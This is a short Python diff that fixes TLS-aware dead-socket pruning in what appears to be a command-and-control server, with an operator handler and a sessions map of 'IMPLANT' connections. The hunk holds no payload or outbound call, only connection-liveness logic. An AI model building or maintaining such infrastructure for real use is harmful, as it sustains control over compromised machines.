@@ -228,13 +228,21 @@ def _handle_operator(conn, addr):
                     dead = []
                     for iid, s in list(_sessions.items()):
                         try:
-                            ret = s.conn.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)
+                            s.conn.settimeout(0)
+                            ret = s.conn.recv(1, socket.MSG_PEEK)
                             if ret == b"":
                                 dead.append(iid)
+                        except ssl.SSLWantReadError:
+                            pass  # no data but TLS connection alive
                         except BlockingIOError:
                             pass  # no data but connection alive
                         except Exception:
                             dead.append(iid)
+                        finally:
+                            try:
+                                s.conn.settimeout(None)
+                            except Exception:
+                                pass
                     for iid in dead:
                         _sessions.pop(iid, None)
                         log.info("- IMPLANT  %s  pruned (dead socket)", iid)
